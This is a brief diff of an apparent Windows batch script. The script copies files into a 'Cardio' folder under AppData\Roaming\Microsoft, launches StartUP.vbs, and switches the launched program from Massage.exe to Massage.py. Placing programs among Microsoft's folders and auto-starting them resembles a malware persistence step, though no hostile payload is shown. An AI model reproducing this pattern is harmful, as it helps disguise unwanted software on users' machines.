@@ -5,4 +5,4 @@ mkdir C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Cardio
 copy * C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Cardio
 start StartUP.vbs
 cd C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Cardio
-start Massage.exe
+start Massage.py
